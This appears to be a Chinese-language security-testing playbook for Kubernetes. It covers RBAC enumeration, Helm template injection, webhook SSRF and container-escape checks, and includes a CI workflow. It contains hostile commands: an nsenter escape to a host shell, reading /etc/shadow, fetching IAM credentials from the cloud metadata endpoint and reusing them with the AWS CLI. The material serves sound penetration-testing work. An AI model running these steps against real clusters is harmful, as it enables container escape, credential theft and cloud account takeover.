---
description: 对基础设施假设进行测试：kubectl 权限探测、Helm 模板渲染测试、Webhook SSRF 探测与容器逃逸验证。
tags: [infra, kubernetes, testing, ssrf, rbac]
---

# 假设测试 (Hypothesis Tester)

## 1. 专家直觉触发器 (Triggers)

专家在验证基础设施安全假设时，会基于以下信号立即启动测试：

- **权限假设可疑**：代码审计发现某 ServiceAccount 可能拥有过度权限，需要快速验证是否真的能创建特权 Pod。
- **模板渲染不可信**：Helm Chart 中存在动态渲染逻辑，需要确认用户输入是否会导致 YAML 结构破坏或命令注入。
- **Webhook 回调可配置**：发现 MutatingWebhook 的 URL 来自 annotation 或 ConfigMap，需要验证是否能将其指向恶意地址。
- **网络隔离可能失效**：怀疑 Pod 可以访问云元数据服务，需要实际探测 `169.254.169.254` 的连通性。
- **容器隔离假设错误**：发现 Pod 使用了 `hostPID` 或挂载了 `docker.sock`，需要验证是否能在容器内获得宿主 shell。

这些触发器意味着“纸面分析”已足够，接下来必须用受控实验确认。

## 2. 不可跳过的问题链 (Question Chain)

在动手测试前，必须明确：

1. **测试环境的隔离性如何保证？**  
   是否在沙箱集群进行？是否有快照恢复机制？测试是否会干扰生产流量？
2. **测试身份与攻击者身份是否一致？**  
   使用 `kubectl --as` 模拟目标 ServiceAccount，还是直接使用其 Token？是否遗漏了 Impersonation 路径？
3. **输入的边界在哪里？**  
   对于 Helm 测试，是修改 `values.yaml` 还是直接篡改 Chart 包？对于 Webhook，是修改配置还是通过资源 annotation 注入？
4. **成功的判定标准是什么？**  
   容器逃逸成功的标志是读取 `/etc/shadow` 还是获得反向 shell？SSRF 成功的标志是返回元数据 token 还是仅证明连通性？
5. **失败的判定是否可靠？**  
   如果 `kubectl auth can-i` 返回 `no`，是否考虑了聚合 API、自定义 webhook 或间接权限（如创建 Deployment 间接创建 Pod）？
6. **测试痕迹如何清理？**  
   创建的恶意 Pod、修改的 Webhook 配置、上传的 poisoned Chart，是否能在测试后完全回滚？

## 3. 攻击链闭合 (Attack Chain Closure)

测试的核心是将“可能性”转化为“确定性”。以下是测试 RBAC -> 逃逸 -> 元数据访问的完整逻辑：

**假设**：命名空间 `test` 中的 `developer` 角色允许创建 Pod，但不允许 `pods/exec`。

**测试步骤 1（直接权限）**：运行 `kubectl auth can-i create pods -n test --as=developer`。若返回 `yes`，则假设部分成立。
**测试步骤 2（间接权限）**：运行 `kubectl auth can-i create deployments -n test --as=developer`。若返回 `yes`，则可通过 Deployment 间接创建 Pod，绕过对裸 Pod 的直接审计。
**测试步骤 3（安全策略绕过）**：尝试 `kubectl apply` 一个包含 `hostPath` 的 Pod。若被准入拒绝，则尝试通过 Deployment 下发同等规格，观察是否同样被拒绝。若 Deployment 被允许而裸 Pod 被拒绝，说明策略存在不一致。
**测试步骤 4（逃逸验证）**：若 Pod 创建成功，执行 `kubectl exec -it <pod> -- nsenter -t 1 -m -u -i -n /bin/sh`。若能执行，则证明 `hostPID` 有效。尝试 `cat /etc/shadow`。
**测试步骤 5（元数据访问）**：在逃逸后的 shell 中执行 `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`。若返回角色名，则证明云元数据可达。
**测试步骤 6（凭证利用）**：使用该临时凭证调用 AWS CLI 尝试 `s3 ls`。若能列出桶，则云账户接管假设成立。

**逻辑闭环**：测试必须覆盖直接权限、间接权限、准入绕过、容器逃逸、网络横向、云凭证利用六个环节。任何一个环节失败，整个攻击链即断裂。因此，**只有端到端测试成功，才构成有效漏洞**。

## 4. 代码示例 (Code Examples)

### 4.1 kubectl 权限探测脚本（测试模式）

```bash
#!/bin/bash
# test_rbac.sh
USER="developer"
NAMESPACE="test"
RESOURCES=("pods" "deployments" "secrets" "configmaps" "roles" "rolebindings")
VERBS=("get" "list" "create" "update" "delete" "exec" "logs")

for res in "${RESOURCES[@]}"; do
  for verb in "${VERBS[@]}"; do
    if kubectl auth can-i "$verb" "$res" -n "$NAMESPACE" --as="$USER" >/dev/null 2>&1; then
      echo "[+] $USER can $verb $res in $NAMESPACE"
    fi
  done
done
```

**用途**：批量枚举指定用户在目标命名空间内的所有有效权限，发现隐性过度授权。

### 4.2 Helm 模板渲染差异测试（测试模式）

```bash
#!/bin/bash
# test_helm_template.sh
helm template myapp ./chart -f values-normal.yaml > normal.yaml
helm template myapp ./chart -f values-malicious.yaml > malicious.yaml
diff normal.yaml malicious.yaml | grep -E "^[+-]" | head -n 50
```

若 diff 显示生成了额外的 `hostPath` 卷或特权安全上下文，则证明模板注入可导致危险资源下发。

### 4.3 Webhook SSRF 探测（测试模式）

```python
# webhook_ssrf_probe.py
import requests
import json

WEBHOOK_URL = "http://169.254.169.254/latest/meta-data/"
PAYLOAD = {
    "apiVersion": "admission.k8s.io/v1",
    "kind": "AdmissionReview",
    "request": {
        "uid": "test-uid",
        "kind": {"group": "", "version": "v1", "kind": "Pod"},
        "resource": {"group": "", "version": "v1", "resource": "pods"},
        "namespace": "default",
        "operation": "CREATE",
        "userInfo": {"username": "test"},
        "object": {}
    }
}

# 假设我们能控制 webhook 指向元数据地址
resp = requests.post(WEBHOOK_URL, json=PAYLOAD, timeout=5)
print(resp.status_code, resp.text[:200])
```

**说明**：虽然 K8s API Server 调用 Webhook 是服务端行为，但如果能篡改 Webhook 的 `clientConfig.url`，则可用此 Payload 观察 API Server 是否会将云元数据响应带入审计日志或返回给客户端。

### 4.4 容器逃逸验证命令（测试模式）

```bash
# 在可疑 Pod 内执行
if [ -f /host/etc/shadow ]; then
  echo "[!] hostPath escape confirmed"
fi

# 若 hostPID 为 true
nsenter -t 1 -m -u -i -n -p -- /bin/cat /etc/shadow 2>/dev/null && echo "[!] hostPID escape confirmed"
```

**用途**：快速验证当前容器是否已通过 `hostPath` 或 `hostPID` 获得宿主文件系统访问权。

### 4.5 网络策略探测（测试模式）

```bash
# 从 Pod 内部测试元数据可达性
kubectl run probe --rm -i --restart=Never --image=alpine -- \
  wget -qO- --timeout=3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "blocked"
```

**用途**：验证 NetworkPolicy 或云厂商的元数据防火墙是否真正生效。若返回数据，则网络隔离假设失效。

## 5. 测试自动化与 CI 集成

将上述测试脚本集成到 CI 流水线中，可在每次部署前自动验证安全基线：

```yaml
# .github/workflows/security-scan.yaml
name: Infra Security Hypothesis Test
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Start Minikube
        uses: medyagh/setup-minikube@latest
      - name: Run RBAC Enumeration
        run: bash test_rbac.sh
      - name: Run Metadata SSRF Probe
        run: kubectl run probe --rm -i --restart=Never --image=alpine -- wget -qO- --timeout=3 http://169.254.169.254/latest/meta-data/ || true
      - name: Check Helm Template Diff
        run: bash test_helm_template.sh
```

**说明**：自动化测试确保基础设施变更不会重新引入已修复的漏洞路径。每次 PR 都应触发最小权限和元数据隔离校验。
